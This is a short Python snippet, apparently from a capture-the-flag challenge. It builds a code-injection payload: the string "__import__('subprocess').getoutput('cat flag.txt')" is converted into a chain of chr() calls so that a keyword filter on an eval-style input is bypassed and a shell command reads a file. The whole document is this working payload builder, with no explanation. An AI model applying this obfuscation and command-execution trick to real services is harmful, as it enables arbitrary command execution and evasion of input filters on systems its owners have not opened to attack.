code = "__import__('subprocess').getoutput('cat flag.txt')"
converted = '+'.join(f"chr({ord(c)})" for c in code)
print(converted)